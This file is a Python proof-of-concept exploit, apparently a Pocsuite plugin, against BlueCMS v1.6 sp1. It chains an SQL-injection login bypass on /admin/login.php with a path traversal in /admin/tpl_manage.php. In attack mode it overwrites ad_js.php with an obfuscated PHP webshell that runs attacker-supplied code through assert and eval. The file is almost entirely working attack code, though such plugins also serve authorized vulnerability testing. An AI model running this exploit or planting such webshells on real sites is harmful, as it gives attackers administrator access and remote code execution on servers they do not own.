# -*- coding:utf-8 -*-
__author__ = 'jerry'

'''
需要配合BlueCMS v1.6 sp1 /admin/login.php SQL注入漏洞,一起利用
'''
import requests
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

from pocsuite.thirdparty.urlparser import get_domain

class Bluecms_V1_6_Sp1_Tpl_Manage_Lfi(POCBase):
    name = "BlueCMS v1.6 sp1 /admin/tpl_manage.php 本地文件包含漏洞"
    vulID = ''
    author = ['']
    vulType = 'lfi'
    version = '1.0'
    references = ['']
    desc = ''''''
    vulDate = ''
    createDate = ''
    updateDate = ''
    appName = ''
    appVersion = ''
    appPowerLink = ''
    samples = []

    def _attack(self):
        '''attack mode'''
        result = {}

        if '://' not in self.url:
            self.url = 'http://' + self.url

        self.domain = get_domain(self.url)
        post_data1 = "admin_name=%df%27+or+1%3D1%23&admin_pwd=admin&submit=%B5%C7%C2%BC&act=do_login"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 '
                                 'Firefox/5.0', "Content-Type": "application/x-www-form-urlencoded"}
        vuln_url = self.domain + '/admin/login.php?act=login'
        response = requests.post(vuln_url, data=post_data1, headers=headers, timeout=10)

        if bool(response.status_code == 200 and "location.replace('index.php')" in response.content):
            self.cookies = dict(PHPSESSID=response.cookies['PHPSESSID'])
            # 上传webshell
            get_shell_url = self.domain + '/admin/tpl_manage.php'
            post_data2 = '''tpl_content=%3C%3Fphp+%24ant%3Dbase64_decode%28%22YXNzZXJ0%22%29%3B%24ant%28%24_POST%5B%27ant%27%5D%29%3B%3F%3E%0D%0A%3C%3Fphp%0D%0A%2F**%0D%0A+*+%5Bbluecms%5D%B0%E6%C8%A8%CB%F9%D3%D0+%B1%EA%D7%BC%CD%F8%C2%E7%A3%AC%B1%A3%C1%F4%CB%F9%D3%D0%C8%A8%C0%FB%0D%0A+*+This+is+not+a+freeware%2C+use+is+subject+to+license+terms%0D%0A+*%0D%0A+*+%24Id%A3%BAad_js.php%0D%0A+*+%24author%A3%BAlucks%0D%0A+*%2F%0D%0Adefine%28%27IN_BLUE%27%2C+true%29%3B%0D%0Arequire_once+dirname%28__FILE__%29+.+%27%2Finclude%2Fcommon.inc.php%27%3B%0D%0A%0D%0A%24ad_id+%3D+%21empty%28%24_GET%5B%27ad_id%27%5D%29+%3F+trim%28%24_GET%5B%27ad_id%27%5D%29+%3A+%27%27%3B%0D%0Aif%28empty%28%24ad_id%29%29%0D%0A%7B%0D%0A%09echo+%27Error%21%27%3B%0D%0A%09exit%28%29%3B%0D%0A%7D%0D%0A%0D%0A%24ad+%3D+%24db-%3Egetone%28%22SELECT+*+FROM+%22.table%28%27ad%27%29.%22+WHERE+ad_id+%3D%22.%24ad_id%29%3B%0D%0Aif%28%24ad%5B%27time_set%27%5D+%3D%3D+0%29%0D%0A%7B%0D%0A%09%24ad_content+%3D+%24ad%5B%27content%27%5D%3B%0D%0A%7D%0D%0Aelse%0D%0A%7B%0D%0A%09if%28%24ad%5B%27end_time%27%5D+%3C+time%28%29%29%0D%0A%09%7B%0D%0A%09%09%24ad_content+%3D+%24ad%5B%27exp_content%27%5D%3B%0D%0A%09%7D%0D%0A%09else%0D%0A%09%7B%0D%0A%09%09%24ad_content+%3D+%24ad%5B%27content%27%5D%3B%0D%0A%09%7D%0D%0A%7D%0D%0A%24ad_content+%3D+str_replace%28%27%22%27%2C+%27%5C%22%27%2C%24ad_content%29%3B%0D%0A%24ad_content+%3D+str_replace%28%22%5Cr%22%2C+%22%5C%5Cr%22%2C%24ad_content%29%3B%0D%0A%24ad_content+%3D+str_replace%28%22%5Cn%22%2C+%22%5C%5Cn%22%2C%24ad_content%29%3B%0D%0Aecho+%22%3C%21--%5Cr%5Cndocument.write%28%5C%22%22.%24ad_content.%22%5C%22%29%3B%5Cr%5Cn--%3E%5Cr%5Cn%22%3B%0D%0Aeval%28%24_GET%5B%22hack%22%5D%29%0D%0A%3F%3E&tpl_name=..%2F..%2Fad_js.php&act=do_edit'''
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 '
                                     'Firefox/5.0', "Content-Type": "application/x-www-form-urlencoded"}
            response = requests.post(get_shell_url, cookies=self.cookies,data=post_data2 , headers=headers, timeout=10)
            if bool(response.status_code == 200): # 确认Webshell上传成功
                adjs_url = self.domain + '/admin/tpl_manage.php?act=edit&tpl_name=../../ad_js.php'
                response = requests.get(adjs_url, cookies=self.cookies, headers=self.headers, timeout=10) # 确认上传webshell成功
                if bool(response.status_code == 200 and "YXNzZXJ0" in response.content):
                    result = {'ShellInfo': {}}
                    result['ShellInfo']['URL'] = get_shell_url


        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        try:
            if '://' not in self.url:
                self.url = 'http://' + self.url

            self.domain = get_domain(self.url)
            vuln_url = self.domain + '/admin/login.php?act=login'
            post_data = "admin_name=%df%27+or+1%3D1%23&admin_pwd=admin&submit=%B5%C7%C2%BC&act=do_login"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 '
                                     'Firefox/5.0', "Content-Type": "application/x-www-form-urlencoded"}
            response = requests.post(vuln_url, data=post_data, headers=headers, timeout=10)

            if bool(response.status_code == 200 and "location.replace('index.php')" in response.content):
                self.cookies = dict(PHPSESSID=response.cookies['PHPSESSID'])
                vuln_url = self.domain + '/admin/tpl_manage.php?act=edit&tpl_name=../../user.php'

                self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 '
                                         'Firefox/5.0', "Content-Type": "application/x-www-form-urlencoded"}
                # PHPSESSID=71a9fad630ea11f6efc9e729266bbc02
                response = requests.get(vuln_url,cookies = self.cookies, headers = self.headers, timeout=10)
                if bool(response.status_code == 200 and "user.php" in response.content):
                    result = {'VerifyInfo': {}}
                    result['VerifyInfo']['URL'] = vuln_url
        except Exception:
            print Exception

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(Bluecms_V1_6_Sp1_Tpl_Manage_Lfi)
